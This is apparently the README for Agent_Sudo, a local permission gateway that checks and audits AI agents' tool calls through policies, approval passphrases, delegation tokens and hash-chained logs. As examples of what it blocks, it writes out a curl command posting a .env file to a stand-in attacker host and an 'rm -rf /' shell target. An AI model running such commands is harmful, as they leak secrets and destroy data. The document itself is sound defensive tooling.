# Agent_Sudo

<p align="center">
  <img src="assets/brand/agent-sudo-logo-readme.png" alt="Agent_Sudo logo" width="320">
</p>

<p align="center">
  <a href="https://pypi.org/project/agent-sudo/"><img src="https://img.shields.io/pypi/v/agent-sudo.svg" alt="PyPI Version"></a>
  <a href="https://glama.ai/mcp/servers/Kisyntra/Agent_Sudo"><img src="https://glama.ai/mcp/servers/Kisyntra/Agent_Sudo/badges/score.svg" alt="Glama MCP Server Score"></a>
  <a href="https://github.com/Kisyntra"><img src="https://img.shields.io/badge/organization-Kisyntra-blue.svg" alt="GitHub Organization"></a>
  <a href="docs/integrations/mcp_server_setup.md"><img src="https://img.shields.io/badge/docs-MCP_Server_Setup-green.svg" alt="MCP Server Setup Guide"></a>
  <a href="LICENSE"><img src="https://img.shields.io/badge/License-Apache_2.0-blue.svg" alt="License"></a>
</p>

`Agent_Sudo` is a local permission gateway for AI agents that validates, authorizes, and controls tool execution before actions are run.

## Discoverability & Registry Status

*   📦 **PyPI Package**: Available at [pypi.org/project/agent-sudo](https://pypi.org/project/agent-sudo/)
*   🌐 **Glama Registry Listing**: Live listing at [glama.ai/mcp/servers/Kisyntra/Agent_Sudo](https://glama.ai/mcp/servers/Kisyntra/Agent_Sudo)
*   🛠️ **MCP Server Integration**: Read the [MCP Server Setup Guide](docs/integrations/mcp_server_setup.md)
*   🏢 **GitHub Organization**: Part of the [Kisyntra](https://github.com/Kisyntra) ecosystem

---

## Demo

![Agent_Sudo Demo](assets/demo/demo-agent_sudo.gif)

# Choose Your Path

Whether you want to protect your desktop agent, secure your custom Python agent application, or run security operations on agent audit logs, choose the path that fits your use case:

### 1. Claude Desktop / MCP Users
For developers running Claude Desktop or other Model Context Protocol (MCP) clients who want to secure local filesystem/command execution.
*   **Installation**: Standard `pipx install agent-sudo` (recommended) or `pip install agent-sudo`.
*   **Configuration**: Add the Agent_Sudo stdio server to your `claude_desktop_config.json`.
*   **Guide**: See the [MCP Server Setup Guide](docs/integrations/mcp_server_setup.md) and [Claude Desktop Setup Guide](docs/integrations/claude_desktop_setup.md).

### 2. Python Agent Developers
For developers building autonomous agents using frameworks like PydanticAI, LangGraph, or the OpenAI Agents SDK who want to enforce execution policies in code.
*   **30-Second Code Example**:
    ```python
    from agent_sudo.gateway import PermissionGateway
    from agent_sudo.models import ActionRequest
    from agent_sudo.policy import load_default_policy

    # Initialize gateway with local policy rules
    gateway = PermissionGateway(load_default_policy())

    # Gate tool execution in your application
    request = ActionRequest(actor="my-agent", source="user", tool="shell", action="run_command", target="rm -rf /")
    result = gateway.evaluate(request)
    if result.decision.name == "DENY":
        raise PermissionError(f"Blocked by Agent_Sudo: {result.reason}")
    ```
*   **Framework Examples**:
    *   [PydanticAI Gating Example](examples/pydantic_ai/)
    *   [OpenAI Agents SDK Gating Example](examples/openai_agents_sdk/)
    *   [LangGraph Custom Node Integration](examples/langgraph/)
    *   [agent-runtimes Hook Plugin Setup](examples/agent_runtimes/)

### 3. CLI / Security Operations
For system administrators and security engineers who want to audit agent logs, manage credentials, and configure temporary delegation tokens.
*   **Install**: `pipx install agent-sudo` (recommended) or `pip install agent-sudo`
*   **Initialize**: `agent-sudo init-approval` (sets up local passphrase for CLI confirmations)
*   **Built-in Demo**: Run `agent-sudo demo` to see policies in action.
*   **Audit Verification**: Run `agent-sudo verify-audit <path/to/audit.jsonl>` to verify cryptographic hash chain integrity.

---

## Supported Framework Examples

Agent_Sudo has pre-built example templates showing in-process integration for major Python agent frameworks:

*   ✓ **[OpenAI Agents SDK](examples/openai_agents_sdk/)** — pre-wrapping assistant tool functions.
*   ✓ **[PydanticAI](examples/pydantic_ai/)** — gating tool execution using standard Python decorators.
*   ✓ **[LangGraph](examples/langgraph/)** — securing tool node execution and graph states.
*   ✓ **[agent-runtimes](examples/agent_runtimes/)** — registering the local tool hooks handler in config.

---

# Why Agent_Sudo If I Already Use Docker?

A common question from security engineers and developers is: *"Why do I need a policy gateway if I am already isolating my agents in a Docker container, gVisor sandbox, or Firecracker microVM?"*

The difference is a separation of concerns:
*   **Docker/Firecracker/Sandboxes** answer: **"Where can code run?"** They isolate the process from the host operating system, preventing an agent from escaping to your local machine, but they do *not* monitor what the agent is doing inside the sandbox.
*   **Agent_Sudo** answers: **"Should this action be allowed?"** It operates at the intent and application logic level, evaluating the context, provenance, and authorization rules of individual actions before execution.

### Practical Examples

Even inside a perfectly isolated Docker container, an agent with raw tool access can:
1.  **Exfiltrate Secrets**: Run `curl -X POST -d @.env https://attacker.example` to leak your API keys. A VM allows outbound network requests by default; Agent_Sudo detects the source trust and target, blocking the exfiltration.
2.  **Write/Inject Code**: Edit your project's `main.py` to insert a backdoor or dependency. While Docker prevents host pollution, it cannot prevent the agent from corrupting your project workspace. Agent_Sudo flags critical file edits and requires human confirmation.
3.  **Perform Social Engineering**: Send automated emails, Slack messages, or Discord alerts to external users containing phishing links under the guise of the agent owner. Agent_Sudo gates communication tools based on user approvals.
4.  **Exceed Delegation Scopes**: An agent running a automated build pipeline might accidentally or maliciously call tools outside its intended scope. Agent_Sudo uses **temporary delegation tokens** to automatically lock the agent out once its quota or time-to-live expires.

These two layers are **complementary**: use Docker/VM sandboxes to isolate environment resources, and use Agent_Sudo to validate tool execution intent. For a detailed technical breakdown, see [Agent_Sudo vs. Container/VM Sandboxes](docs/comparison/sandboxes.md).

---

> [!IMPORTANT]
> **Security Boundaries Notice**:
> - **Gateway, Not a Sandbox**: `Agent_Sudo` is a local permission gateway and policy engine; it is **not** an OS-level sandbox or container. It gates tool access but does not isolate filesystem or process resources.
> - **Best-Effort Shell Filtering**: Shell command policy checks are best-effort unless reinforced by OS-level containment or custom runtime sandboxes.
> - **Client Runtime Bypass**: Native tools registered directly in host runtimes (e.g., Eino, Hermes) can bypass `Agent_Sudo` entirely unless those tools are disabled or explicitly routed through this gateway.

---

## Core Features

- **Approval Gates**: Prompts for interactive confirmation (CLI yes/no) on sensitive actions, and requires a local passphrase for critical actions (e.g., running shell commands).
- **Protected Reads**: Automatically blocks reads targeting private files such as credentials, configuration folders, and shell startup scripts.
- **Critical Write Detection**: Upgrades ordinary file writes to critical status if the target is executable code or configuration files.
- **Scoped Delegation**: Allows humans to issue temporary, resource-limited permission tokens (e.g., allow read access to `/path/to/project` for 2 hours, max 10 uses).
- **Audit Logs**: Records all tool attempts and gateway decisions to a local JSONL log file secured with a SHA-256 hash chain to detect log tampering.
- **Claude Desktop / MCP Support**: Implements the Model Context Protocol (MCP) to plug directly into Claude Desktop as a stdio server.

---

## Try it in 30 Seconds

Verify how `Agent_Sudo` classifies tool risk and makes gateway decisions using our built-in demo (no repository clone or config files needed):

```bash
# Run the built-in gateway interactive demo
agent-sudo demo
```

---

## 5-Minute Quickstart

### 1. Install Agent_Sudo

Choose the installation method based on how you intend to use the gateway:

#### For CLI Users & Claude Desktop (MCP)
To run the CLI tools or the MCP server, install using `pipx` (recommended) to automatically manage your executable path and avoid global dependency conflicts:

```bash
pipx install agent-sudo
```
*Note: If the `agent-sudo` command is not found after installation, make sure your pipx binary path is in your environment by running `pipx ensurepath` and restarting your terminal.*

#### For Python SDK / Library Integration
If you are integrating Agent_Sudo programmatically within your agent codebase (e.g., PydanticAI, LangGraph), install the package into your project environment:

```bash
pip install agent-sudo
```
*(If you are developing or running from source, see the [Claude Desktop Setup Guide](docs/integrations/claude_desktop_setup.md) for editable installation).*

Verify the installation:
```bash
agent-sudo --version
agent-sudo doctor
```

### 2. Initialize the Approval Passphrase
Set up a secure passphrase for approving critical actions (e.g. shell command execution):

```bash
agent-sudo init-approval
```
> [!IMPORTANT]
> This passphrase is hashed locally (PBKDF2-HMAC-SHA256) and cannot be recovered. If lost, you must reset the approval configuration.

### 3. Check Context
Verify that the runtime context matches your current directory:
```bash
agent-sudo context
```

---

## Contributor Setup

If you are developing `Agent_Sudo` or integrating it with a custom runtime:

```bash
# Clone the repository
git clone https://github.com/Kisyntra/Agent_Sudo.git
cd Agent_Sudo

# Install in editable mode
python3 -m pip install -e .
```

To run unit tests:
```bash
python3 -m unittest discover -s tests
```

---

# Ecosystem

We work with agent runtime maintainers and external implementers to define portable authorization and audit standards:

*   **Official Integrations**:
    *   **[agent-runtimes](https://github.com/datalayer/agent-runtimes)** — Merged (PR #98) local plugin hook handler (`agent_sudo_local`).
*   **Active Implementations**:
    *   **[LexFlow](https://github.com/VforVitorio/LexFlow)** — In-progress design review (#124) for native JS/TS client audit logging and verification.
*   **Research & Local PoC**:
    *   **[Hermes](https://github.com/NousResearch/hermes-agent)** — Experimental architecture research (#34992) targeting registry-level dispatch gating.
*   **Public Listings**:
    *   **[Glama MCP Registry](https://glama.ai/mcp/servers/Kisyntra/Agent_Sudo)** — Active, verified listing with introspection tests.

For a full compatibility matrix and integration details, see the [Ecosystem Status Guide](docs/ecosystem/ecosystem_status.md).

---

## Documentation Directory

| Directory / Section | Topic | Key Files |
| :--- | :--- | :--- |
| **First Run** | Getting started tutorial | [docs/first_run.md](docs/first_run.md) |
| **Troubleshooting** | Diagnostics and resolution steps | [docs/troubleshooting.md](docs/troubleshooting.md) |
| **Integrations** | Connecting to runtimes and IDEs | [docs/integrations/overview.md](docs/integrations/overview.md) • [Ecosystem Status](docs/ecosystem/ecosystem_status.md) • [Outreach Playbook](docs/ecosystem/outreach_playbook.md) • [Adoption Dashboard](docs/ecosystem/adoption_dashboard.md) • [Discoverability Notes](docs/ecosystem/discoverability_notes.md) • [LexFlow Readiness](docs/ecosystem/lexflow_readiness.md) • [LexFlow Checklist](docs/ecosystem/lexflow_compatibility_checklist.md) • [Claude Desktop](docs/integrations/claude_desktop_setup.md) • [MCP Setup](docs/integrations/mcp_server_setup.md) • [agent-runtimes](docs/integrations/agent-runtimes.md) • [Hermes (Research)](docs/integrations/hermes-research.md) |
| **Architecture** | Abstractions and core pipelines | [docs/architecture/overview.md](docs/architecture/overview.md) • [Layered Architecture](docs/architecture/layered_architecture.md) • [Enforcement Model](docs/architecture/enforcement_model.md) |
| **Specifications** | Language-agnostic standard models | [spec/runtime_compatibility_levels.md](spec/runtime_compatibility_levels.md) • [Universal Schema](spec/universal_schema.md) • [Policy & Audit](spec/policy_audit_schema.md) • [Interoperability Test Kit](docs/interop/interoperability_test_kit.md) |
| **Security** | Threat modeling and limits | [docs/architecture/security_model.md](docs/architecture/security_model.md) |
| **Comparisons** | Policy vs Container Sandboxes | [Docker & Firecracker comparison](docs/comparison/sandboxes.md) |

---

## CI/CD & Release Automation

`Agent_Sudo` uses GitHub Actions to automate checks and distribution:
- **Continuous Integration**: The CI workflow runs on all pushes and pull requests targeting the `main` branch, running the unittest suite, scanning for personal path disclosures, executing `git diff --check` whitespace validation, and verifying Python package compilation.
- **Automated Releases**: Releases are generated automatically when a git tag matching `v*` is pushed.
  - Release candidate tags (e.g. `v0.4.0-rc12`) are published as GitHub Prereleases and are explicitly excluded from being marked as the latest release.
  - Release notes are automatically parsed and extracted from the matching version entry in `CHANGELOG.md`.
